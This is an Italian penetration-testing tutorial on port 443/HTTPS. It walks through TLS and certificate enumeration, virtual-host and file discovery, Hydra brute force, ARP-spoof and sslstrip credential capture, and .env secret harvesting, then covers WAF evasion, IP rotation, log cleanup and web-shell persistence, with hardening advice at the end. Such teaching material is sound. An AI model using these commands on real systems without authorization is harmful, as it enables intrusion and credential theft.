---
title: 'Porta 443 HTTPS: cos’è, come funziona e rischi di sicurezza di TLS e web app'
slug: porta-443-https
description: 'Scopri a cosa serve la porta 443 HTTPS, come funzionano TLS, certificati e virtual host, e quali rischi introduce tra hostname esposti nei SAN, misconfigurazioni TLS, file sensibili, pannelli admin e superfici d’attacco web.'
image: /porta-443-https.webp
draft: true
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - https
  - tls-enumeration
---

> **Executive Summary** — La porta 443 HTTPS è la porta più esposta su Internet e nelle reti enterprise. Ogni applicazione web, API, pannello di amministrazione e servizio cloud comunica su questa porta. In un pentest, la porta 443 non è solo "un sito web": è certificati che rivelano hostname interni, TLS misconfiguration che abilitano downgrade, virtual host nascosti, pannelli admin dimenticati e applicazioni vulnerabili. Questo articolo copre dall'enumerazione TLS alla scoperta di directory, dall'exploit di misconfiguration web al bypass di WAF, con comandi operativi per ogni fase.

**3 punti chiave:**
Il certificato TLS sulla porta 443 espone **hostname, subdomain e organizzazione** — analizzalo sempre prima di tutto
La stessa porta 443 spesso ospita **più virtual host**: enumera con fuzz per scoprire pannelli admin e app nascoste
Le misconfiguration TLS (cipher deboli, versioni obsolete, HSTS assente) abilitano **MitM e downgrade attack**

Porta 443 HTTPS è dove transita la maggior parte del traffico web cifrato. Quando la trovi aperta — e la trovi sempre — stai guardando la superficie di attacco più ampia di qualsiasi target. La vulnerabilità della porta 443 si declina su tre livelli: il protocollo TLS stesso, il web server che lo serve, e l'applicazione che ci gira sopra. L'enumerazione porta 443 rivela versioni software, certificati con hostname interni, cipher suite che indicano il livello di hardening, e virtual host che nascondono servizi non destinati al pubblico. Nel pentest HTTPS è il punto di partenza per web application testing, ma anche per initial access su pannelli di gestione, API non protette e servizi esposti. Nella kill chain occupa la posizione di initial access e spesso anche di persistence (web shell, backdoor su applicazioni).

## 1. Anatomia Tecnica della Porta 443

La porta 443 è registrata IANA come `https` su protocollo TCP. Il flusso di una connessione HTTPS:

1. **TCP handshake** sulla porta 443
2. **TLS handshake**: ClientHello (cipher proposti) → ServerHello (cipher scelto + certificato) → key exchange → Finished
3. **HTTP request**: la richiesta HTTP viaggia nel tunnel TLS
4. **HTTP response**: il server risponde con status code, header e body cifrati

Le varianti operative includono TLS 1.2 (ancora dominante), TLS 1.3 (adozione in crescita, handshake semplificato), HTTP/2 e HTTP/3 (QUIC su UDP/443) e mutual TLS (mTLS, il client presenta un certificato).

```
Misconfig: TLS 1.0/1.1 ancora abilitato
Impatto: attacchi downgrade (POODLE, BEAST) e cipher suite deboli negoziabili
Come si verifica: nmap --script ssl-enum-ciphers -p 443 [target]
```

```
Misconfig: Certificato con Subject Alternative Name (SAN) che espone hostname interni
Impatto: rivela subdomain, servizi interni e infrastruttura non destinata al pubblico
Come si verifica: openssl s_client -connect [target]:443 | openssl x509 -noout -text | grep DNS:
```

```
Misconfig: Directory listing abilitato o file sensibili esposti
Impatto: accesso a backup, config, file con credenziali senza autenticazione
Come si verifica: curl -sk https://[target]/.git/HEAD o gobuster dir -u https://[target] -w common.txt -k
```

## 2. Enumerazione Base

L'enumerazione della porta 443 HTTPS parte dal fingerprint del servizio e dall'analisi del certificato TLS. Questi due step forniscono più informazioni di qualsiasi altro approccio iniziale.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 443 --script ssl-enum-ciphers,http-title,http-server-header 10.10.10.20
```

**Output atteso:**

```
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Corporate Portal - Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
|   TLSv1.3:
|     ciphers:
|       TLS_AES_256_GCM_SHA384 (ecdh_x25519) - A
|_  least strength: A
| ssl-cert:
|   Subject: commonName=portal.corp.local
|   Subject Alternative Name: DNS:portal.corp.local, DNS:admin.corp.local, DNS:api.corp.local, DNS:*.dev.corp.local
|   Issuer: commonName=Corp-CA
|   Not valid after: 2027-01-15
```

**Parametri:**

* `-sV`: identifica web server e versione (Apache, Nginx, IIS)
* `-sC`: esegue script default inclusi banner e titolo HTTP
* `--script ssl-enum-ciphers`: enumera tutte le cipher suite e versioni TLS supportate

### Comando 2: openssl per analisi certificato dettagliata

```bash
openssl s_client -connect 10.10.10.20:443 -servername portal.corp.local 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|DNS:|Issuer:|Not After"
```

**Output atteso:**

```
        Issuer: CN = Corp-CA, O = Corp Inc, L = Milano
        Not After : Jan 15 12:00:00 2027 GMT
        Subject: CN = portal.corp.local
            DNS:portal.corp.local, DNS:admin.corp.local, DNS:api.corp.local, DNS:*.dev.corp.local
```

**Cosa ci dice questo output:** il certificato rivela 4 hostname/pattern: il portale principale, un pannello admin (`admin.corp.local`), un'API (`api.corp.local`) e un wildcard per lo sviluppo (`*.dev.corp.local`). Il certificato è firmato da una CA interna (`Corp-CA`) — non è un servizio pubblico. Ogni hostname è un target separato da enumerare.

## 3. Enumerazione Avanzata

### Virtual host discovery

Il web server sulla porta 443 può servire contenuti diversi in base all'header `Host`. Scopri tutti i virtual host con fuzzing. Per una panoramica completa delle tecniche di discovery, consulta la [guida all'enumerazione web](https://hackita.it/articoli/enumeration).

```bash
gobuster vhost -u https://10.10.10.20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k --append-domain -d corp.local
```

**Output:**

```
Found: admin.corp.local (Status: 200) [Size: 4521]
Found: api.corp.local (Status: 200) [Size: 89]
Found: jenkins.corp.local (Status: 403) [Size: 287]
Found: gitlab.corp.local (Status: 302) [Size: 0]
Found: monitoring.corp.local (Status: 401) [Size: 0]
```

**Lettura dell'output:** 5 virtual host scoperti. `jenkins.corp.local` restituisce 403 (forbidden, ma esiste), `gitlab.corp.local` redirige (302, probabilmente a una pagina di login), `monitoring.corp.local` richiede autenticazione (401). Ciascuno è un vettore di attacco distinto.

### Directory e file discovery

```bash
feroxbuster -u https://portal.corp.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -x php,asp,aspx,jsp,bak,old,conf -t 50
```

**Output:**

```
200    GET    312l    1024w   https://portal.corp.local/login
200    GET      5l      12w   https://portal.corp.local/robots.txt
200    GET    200l     500w   https://portal.corp.local/api/v1/status
301    GET        -        -  https://portal.corp.local/backup => https://portal.corp.local/backup/
200    GET      1l       1w   https://portal.corp.local/.env
403    GET        -        -  https://portal.corp.local/server-status
200    GET    100l     250w   https://portal.corp.local/config.php.bak
```

**Lettura dell'output:** `.env` esposto — contiene variabili d'ambiente (spesso credenziali DB, API key, secret key). `config.php.bak` è un backup della configurazione PHP con potenziali credenziali. `/backup/` è una directory accessibile. Ognuno di questi è un finding critico. Approfondisci le tecniche di directory bruteforce per web application con [fuff](https://hackita.it/articoli/ffuf) o [feroxbuster](https://hackita.it/articoli/feroxbuster) 

### TLS vulnerability scanning con testssl.sh

```bash
testssl.sh --fast --quiet https://10.10.10.20:443
```

**Output:**

```
 Testing protocols via sockets
 SSLv2      not offered
 SSLv3      not offered
 TLS 1      not offered
 TLS 1.1    not offered
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK)

 Testing vulnerabilities
 Heartbleed (CVE-2014-0160)       not vulnerable
 CCS (CVE-2014-0224)              not vulnerable
 Ticketbleed (CVE-2016-9244)      not vulnerable
 ROBOT                            not vulnerable
 Secure Renegotiation              supported
 CRIME, TLS (CVE-2012-4929)       not vulnerable
 BREACH (CVE-2013-3587)           potentially NOT ok, "gzip" HTTP compression detected
 POODLE, SSL                      not vulnerable
 Downgrade attack prevention      OK
 HSTS                             not offered  <<<--- FINDING
```

**Lettura dell'output:** protocolli TLS configurati correttamente (solo 1.2 e 1.3). Nessuna vulnerabilità TLS critica. Però HSTS non è configurato — questo permette attacchi SSL stripping. BREACH potenzialmente sfruttabile con compressione HTTP attiva. Questi sono finding di compliance ma anche vettori per [attacchi man-in-the-middle](https://hackita.it/articoli/man-in-the-middle).

### Analisi degli header di sicurezza

```bash
curl -skI https://portal.corp.local | grep -iE "server|x-powered|x-frame|content-security|strict-transport|x-xss|x-content-type"
```

**Output:**

```
Server: Apache/2.4.58 (Ubuntu)
X-Powered-By: PHP/8.2.15
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'
```

**Lettura dell'output:** manca `Strict-Transport-Security` (HSTS) e `X-Content-Type-Options`. `X-Powered-By` rivela PHP 8.2.15 — versione specifica da verificare per CVE noti. Il `Server` header conferma Apache 2.4.58 su Ubuntu.

## 4. Tecniche Offensive

**Credential brute force su login form**

Contesto: pannello di login su HTTPS senza rate limiting o CAPTCHA. Comune su applicazioni interne corporate.

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt portal.corp.local https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4 -w 5
```

**Output (successo):**

```
[443][http-post-form] host: portal.corp.local   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
```

**Output (fallimento):**

```
[443][http-post-form] host: portal.corp.local
1 of 1 target completed, 0 valid passwords found
```

**Cosa fai dopo:** accedi al portale come admin. Mappa le funzionalità: upload file, gestione utenti, configurazione sistema. Cerca vettori per RCE (file upload, template injection, command injection). Consulta la guida su [tecniche di brute force per applicazioni web](https://hackita.it/articoli/hydra).

**SSL Stripping (MitM senza HSTS)**

Contesto: target senza HSTS header. Sei in posizione MitM (stessa rete della vittima).

```bash
# Terminal 1: ARP spoof
sudo arpspoof -i eth0 -t [victim_ip] [gateway_ip]

# Terminal 2: sslstrip
sudo sslstrip -l 8080

# Terminal 3: iptables redirect
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

**Output (successo):**

```
sslstrip 0.9 by Moxie Marlinspike
[+] Got request for: portal.corp.local
[+] Stripping SSL from: https://portal.corp.local/login
[+] POST /login username=admin&password=S3cretP4ss!
```

**Output (fallimento):**

```
[+] Client sent HTTPS directly (HSTS preloaded or cached)
```

**Cosa fai dopo:** hai intercettato credenziali in chiaro. Usale per accedere direttamente al portale e a qualsiasi altro servizio dove l'utente riusa la password.

**Exploiting .env e file di configurazione esposti**

Contesto: file `.env` o backup di configurazione accessibili senza autenticazione sulla porta 443.

```bash
curl -sk https://portal.corp.local/.env
```

**Output (successo):**

```
APP_NAME=CorporatePortal
APP_ENV=production
APP_KEY=base64:yK3s8mN2pL...
DB_HOST=10.10.10.50
DB_DATABASE=portal_prod
DB_USERNAME=portal_db
DB_PASSWORD=Pr0d_DB!2026
MAIL_HOST=smtp.corp.local
MAIL_USERNAME=noreply@corp.local
MAIL_PASSWORD=MailP4ss!
REDIS_HOST=10.10.10.51
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJal...
```

**Output (fallimento):**

```
<!DOCTYPE html>
<html><head><title>403 Forbidden</title></head>
```

**Cosa fai dopo:** hai credenziali database (`portal_db`/`Pr0d_DB!2026`), SMTP (`noreply@corp.local`/`MailP4ss!`), Redis host e chiavi AWS. Testa ogni credenziale: connettiti al DB con `mysql -h 10.10.10.50 -u portal_db -p`, verifica l'accesso AWS con `aws sts get-caller-identity`. Approfondisci il [pivoting verso servizi interni](https://hackita.it/articoli/pivoting).

**Virtual host routing abuse per accesso a pannelli admin**

Contesto: il web server serve contenuti diversi in base all'header Host. Un virtual host non pubblico è raggiungibile manipolando l'header.

```bash
curl -sk https://10.10.10.20 -H "Host: admin.corp.local"
```

**Output (successo):**

```
<!DOCTYPE html>
<html>
<head><title>Admin Panel - Corp</title></head>
<body>
<h1>System Administration</h1>
<form action="/admin/login" method="POST">
```

**Output (fallimento):**

```
<html><head><title>404 Not Found</title></head>
```

**Cosa fai dopo:** hai trovato il pannello admin. Testa credenziali default, brute force con hydra, o cerca vulnerabilità specifiche del framework admin.

## 5. Scenari Pratici di Pentest

### Scenario 1: Internet-facing web app con certificate transparency

**Situazione:** target è un'azienda con dominio pubblico `corp.com`. Devi enumerare la superficie HTTPS esposta su Internet.

**Step 1:**

```bash
curl -s "https://crt.sh/?q=%.corp.com&output=json" | jq -r '.[].name_value' | sort -u | head -20
```

**Output atteso:**

```
admin.corp.com
api.corp.com
corp.com
dev.corp.com
jenkins.corp.com
mail.corp.com
staging.corp.com
vpn.corp.com
www.corp.com
```

**Step 2:**

```bash
for host in $(cat subdomains.txt); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$host" --connect-timeout 3)
  echo "$host : $code"
done
```

**Output atteso:**

```
admin.corp.com : 401
api.corp.com : 200
jenkins.corp.com : 403
staging.corp.com : 200
vpn.corp.com : 200
```

**Se fallisce:**

* Causa probabile: DNS non risolve i subdomain (sono interni)
* Fix: aggiungi al `/etc/hosts` con l'IP del target: `echo "1.2.3.4 admin.corp.com" >> /etc/hosts`

**Tempo stimato:** 10-20 minuti

### Scenario 2: Lab con Apache/PHP vulnerabile

**Situazione:** macchina CTF con web app PHP su porta 443. Stack classico LAMP con misconfiguration.

**Step 1:**

```bash
nikto -h https://10.10.10.20 -ssl -Tuning 1234 2>/dev/null | head -30
```

**Output atteso:**

```
+ Server: Apache/2.4.58 (Ubuntu)
+ /: The X-Content-Type-Options header is not set.
+ /config.php.bak: PHP config backup found.
+ /.env: Environment file found.
+ /phpinfo.php: PHP info file found.
+ /server-status: Apache server-status found (403).
```

**Step 2:**

```bash
curl -sk https://10.10.10.20/phpinfo.php | grep -E "DOCUMENT_ROOT|SERVER_SOFTWARE|disable_functions"
```

**Output atteso:**

```
DOCUMENT_ROOT: /var/www/html
SERVER_SOFTWARE: Apache/2.4.58
disable_functions: no value
```

**Se fallisce:**

* Causa probabile: `phpinfo.php` non esiste
* Fix: prova varianti: `/info.php`, `/test.php`, `/php_info.php`

**Tempo stimato:** 5-15 minuti

### Scenario 3: Cloud-exposed API senza autenticazione

**Situazione:** API REST su HTTPS esposta su cloud. Documentazione Swagger/OpenAPI accessibile pubblicamente.

**Step 1:**

```bash
curl -sk https://api.corp.com/swagger.json | jq '.paths | keys[]'
```

**Output atteso:**

```
"/api/v1/users"
"/api/v1/users/{id}"
"/api/v1/admin/config"
"/api/v1/admin/backup"
"/api/v1/auth/login"
"/api/v1/files/upload"
```

**Step 2:**

```bash
curl -sk https://api.corp.com/api/v1/users | jq '.[0:3]'
```

**Output atteso:**

```json
[
  {"id": 1, "username": "admin", "email": "admin@corp.com", "role": "administrator"},
  {"id": 2, "username": "jsmith", "email": "jsmith@corp.com", "role": "user"},
  {"id": 3, "username": "svc_api", "email": "api@corp.com", "role": "service"}
]
```

**Se fallisce:**

* Causa probabile: endpoint richiede token Bearer
* Fix: cerca token hardcoded in `/swagger.json`, prova header `Authorization: Bearer test` o endpoint `/auth/login` con credenziali default

**Tempo stimato:** 10-20 minuti

## 6. Attack Chain Completa

```
Recon (cert + subdomain enum) → Service Fingerprint → Directory/File Discovery → Credential Harvest (.env, config) → Initial Access (login/exploit) → Lateral Movement (DB, internal services) → Persistence (web shell)
```

| Fase               | Tool           | Comando chiave                                          | Output/Risultato                  |
| ------------------ | -------------- | ------------------------------------------------------- | --------------------------------- |
| Recon              | crt.sh/openssl | `curl crt.sh/?q=%.corp.com`                             | Subdomain da cert transparency    |
| Fingerprint        | nmap/curl      | `nmap -sV --script ssl-enum-ciphers -p 443`             | Web server, TLS version, cipher   |
| Discovery          | feroxbuster    | `feroxbuster -u https://[target] -w raft-medium.txt -k` | File sensibili, directory, backup |
| Credential Harvest | curl           | `curl -sk https://[target]/.env`                        | DB creds, API keys, SMTP creds    |
| Initial Access     | hydra/curl     | `hydra ... https-post-form`                             | Login con credenziali valide      |
| Lateral Movement   | mysql/ssh      | `mysql -h [db_host] -u [user] -p`                       | Accesso DB con creds da .env      |
| Persistence        | bash           | Upload web shell via file upload                        | Accesso persistente al server     |

**Timeline stimata:** 30-120 minuti. La fase più variabile è la discovery (dipende dal numero di virtual host e dalla dimensione dell'applicazione).

**Ruolo della porta 443:** è il punto di ingresso universale. Quasi tutti i servizi moderni sono raggiungibili via HTTPS. In un pentest esterno, la 443 è spesso l'unica porta accessibile attraverso il firewall.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **WAF logs**: ModSecurity, CloudFlare, AWS WAF — regole per directory traversal, SQL injection, XSS
* **Web server access log**: path: `/var/log/apache2/access.log` (Apache), `/var/log/nginx/access.log` (Nginx)
* **IDS/IPS**: regole Suricata per pattern offensivi in HTTPS (richiede TLS inspection)
* **SIEM**: alert su 404 massivi (directory brute), 401 ripetuti (credential brute), user-agent anomali

### Tecniche di Evasion

```
Tecnica: Rotazione User-Agent
Come: usa -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" in curl/feroxbuster
Riduzione rumore: i tool di scan hanno user-agent riconoscibili (Gobuster, Nikto, sqlmap). Un UA realistico bypassa filtri base
```

```
Tecnica: Rate limiting volontario
Come: feroxbuster -t 5 --delay 1 — 5 thread con 1 secondo di delay tra richieste
Riduzione rumore: evita alert su "burst" di richieste. Le WAF cloud (CloudFlare) hanno soglie tipiche di 100-200 req/min
```

```
Tecnica: Utilizzo di IP rotation
Come: usa proxy chain o multiple VPS con IP diversi, ruota ogni 50-100 richieste
Riduzione rumore: distribuisce il traffico su più IP, rendendo difficile la correlazione
```

### Cleanup Post-Exploitation

* Se hai uploadato una web shell: rimuovila e cancella i log di accesso alla path
* Se hai modificato file di configurazione: ripristina gli originali
* I log del web server contengono ogni tua richiesta con IP e timestamp: senza accesso root al server non puoi cancellarli

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap/openssl (fingerprint) → crt.sh/amass (subdomain) → feroxbuster/gobuster (discovery) → nikto/testssl (vuln scan) → hydra/burp (exploit) → curl (data extraction) → webshell (persistence)
```

Dati che passano tra fasi: hostname da certificato, subdomain, virtual host, path di file sensibili, credenziali da .env/config, versioni software per CVE lookup.

### Tabella comparativa

| Aspetto           | HTTPS (443/TCP)                    | HTTP (80/TCP)               | HTTP/3 (443/UDP)                          |
| ----------------- | ---------------------------------- | --------------------------- | ----------------------------------------- |
| Porta default     | 443                                | 80                          | 443 (UDP)                                 |
| Cifratura         | TLS obbligatorio                   | Nessuna                     | QUIC (TLS 1.3 integrato)                  |
| Intercettazione   | Richiede TLS inspection/MitM       | Triviale con tcpdump        | Complessa (QUIC encrypted)                |
| Header esposti    | Solo dopo TLS handshake            | Immediatamente              | Solo dopo QUIC handshake                  |
| WAF bypass        | Più difficile (inspection nel WAF) | Più facile (no cifratura)   | Ancora poco supportato dai WAF            |
| Quando preferirlo | Qualsiasi web pentest moderno      | Legacy app, redirect to 443 | Target con HTTP/3 abilitato (CDN, Google) |

## 9. Troubleshooting

| Errore / Sintomo                                | Causa                                                   | Fix                                                                                   |
| ----------------------------------------------- | ------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `SSL: certificate verify failed`                | Certificato self-signed o CA interna                    | Aggiungi `-k` a curl, `--insecure` a feroxbuster, `-o tls_reqcert=never` a ldapsearch |
| `Connection reset` dopo TLS handshake           | SNI mismatch — il server non riconosce il `Host` header | Usa `-servername [hostname]` con openssl o `-H "Host: [vhost]"` con curl              |
| Feroxbuster restituisce solo 403                | WAF blocca lo user-agent del tool                       | Aggiungi `--user-agent "Mozilla/5.0 ..."`                                             |
| `curl: (35) error:SSL routines`                 | Cipher suite non supportata dal client                  | Forza cipher: `curl --ciphers 'ECDHE-RSA-AES256-GCM-SHA384' ...`                      |
| Nmap ssl-enum-ciphers non restituisce risultati | Il server richiede SNI per rispondere                   | Usa `--script-args ssl-enum-ciphers.host=[hostname]`                                  |
| Hydra restituisce falsi positivi                | La pagina di errore ha stesso status code del successo  | Usa stringa di match più specifica: `F=Invalid` o `S=Welcome`                         |

## 10. FAQ

**D: Come enumerare subdomain dalla porta 443 HTTPS?**

R: Analizza il certificato TLS: `openssl s_client -connect [target]:443 | openssl x509 -noout -ext subjectAltName`. I campi SAN (Subject Alternative Name) elencano tutti gli hostname coperti. Completa con Certificate Transparency: `curl "https://crt.sh/?q=%.domain.com&output=json"`.

**D: Porta 443 HTTPS è vulnerabile se usa TLS 1.2?**

R: TLS 1.2 è ancora sicuro se configurato con cipher suite forti (ECDHE + AES-GCM). Le vulnerabilità nascono da cipher deboli (RC4, CBC mode con bug), mancanza di HSTS, o versioni obsolete (TLS 1.0/1.1) abilitate in parallelo. Verifica con `testssl.sh --fast https://[target]`.

**D: Come scoprire virtual host nascosti sulla porta 443?**

R: Usa `gobuster vhost -u https://[IP] -w subdomains.txt -k --append-domain -d domain.com`. Il fuzzing dell'header Host rivela virtual host che rispondono con status diverso da quello di default. Aggiungi gli hostname scoperti dal certificato come punto di partenza.

**D: Cos'è SSL stripping e quando funziona?**

R: SSL stripping intercetta il traffico HTTP (porta 80) e impedisce l'upgrade a HTTPS, mantenendo la connessione in chiaro. Funziona solo se il target non ha HSTS configurato o se l'utente non ha mai visitato il sito (nessun HSTS cached). Verifica con `curl -sI https://[target] | grep Strict-Transport`.

**D: Come testare una web application su HTTPS con Burp Suite?**

R: Configura Burp come proxy (127.0.0.1:8080), installa il certificato CA di Burp nel browser, e naviga su HTTPS. Burp intercetta il traffico TLS come MitM. Per API: `curl --proxy http://127.0.0.1:8080 -k https://[target]/api/endpoint`.

**D: Quali file sensibili cercare su porta 443?**

R: I più comuni: `.env` (variabili d'ambiente), `.git/HEAD` (repository git esposto), `web.config` (IIS), `config.php.bak`/`.old`, `robots.txt`, `sitemap.xml`, `/server-status` (Apache), `phpinfo.php`, `/swagger.json` o `/openapi.yaml` (API documentation), `/.well-known/` (metadata).

## 11. Cheat Sheet Finale

| Azione              | Comando                                                                                            | Note                        |
| ------------------- | -------------------------------------------------------------------------------------------------- | --------------------------- |
| Scan HTTPS          | `nmap -sV -sC -p 443 --script ssl-enum-ciphers [target]`                                           | Fingerprint + TLS audit     |
| Analisi certificato | `openssl s_client -connect [target]:443 \| openssl x509 -noout -text`                              | SAN, issuer, scadenza       |
| Subdomain da cert   | `curl -s "https://crt.sh/?q=%.domain.com&output=json" \| jq '.[].name_value' \| sort -u`           | Certificate Transparency    |
| Virtual host fuzz   | `gobuster vhost -u https://[IP] -w subdomains.txt -k`                                              | Scopri vhost nascosti       |
| Directory discovery | `feroxbuster -u https://[target] -w raft-medium.txt -k -x php,bak,env`                             | File sensibili              |
| TLS vuln scan       | `testssl.sh --fast https://[target]`                                                               | HSTS, cipher, vulnerabilità |
| Header security     | `curl -skI https://[target]`                                                                       | Server, X-Powered-By, HSTS  |
| Brute force login   | `hydra -l admin -P top-1000.txt [target] https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` | Rispetta rate limit         |
| File .env           | `curl -sk https://[target]/.env`                                                                   | Credenziali, API key        |
| Git esposto         | `curl -sk https://[target]/.git/HEAD`                                                              | Se risponde = repo esposto  |

### Perché Porta 443 è rilevante nel 2026

La porta 443 è la porta più scansionata e più attaccata al mondo. Con la morte definitiva di HTTP (porta 80) per applicazioni di produzione, tutto il traffico web transita su HTTPS. API REST, GraphQL, WebSocket, pannelli admin, VPN web — tutto su porta 443. Ogni organizzazione ha decine o centinaia di servizi sulla 443. Verifica la superficie con `nmap -p 443 [range] --open -oG -` come primo step di qualsiasi engagement esterno.

### Hardening e Mitigazione

* Abilita HSTS con max-age lungo: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
* Disabilita TLS 1.0/1.1 e cipher CBC: configura solo TLS 1.2+ con ECDHE+AES-GCM
* Rimuovi header informativi: `ServerTokens Prod` (Apache), `server_tokens off` (Nginx)
* Impedisci accesso a file sensibili: `.htaccess` con deny per `.env`, `.git`, backup

### OPSEC per il Red Team

Le richieste HTTPS sulla porta 443 sono il traffico più normale che esista. Il livello di rumore di base è basso — il problema è il volume e il pattern. Una directory brute force con 10000 richieste in 30 secondi è immediatamente visibile in qualsiasi WAF. Per ridurre visibilità: limita a 5-10 richieste al secondo, usa user-agent realistici, evita path di wordlist note che i WAF riconoscono (come `/admin/`, `/wp-login.php` se non è WordPress), e distribuisci le richieste su più IP se possibile.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 8446 (TLS 1.3), RFC 2818 (HTTP over TLS), RFC 6797 (HSTS).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
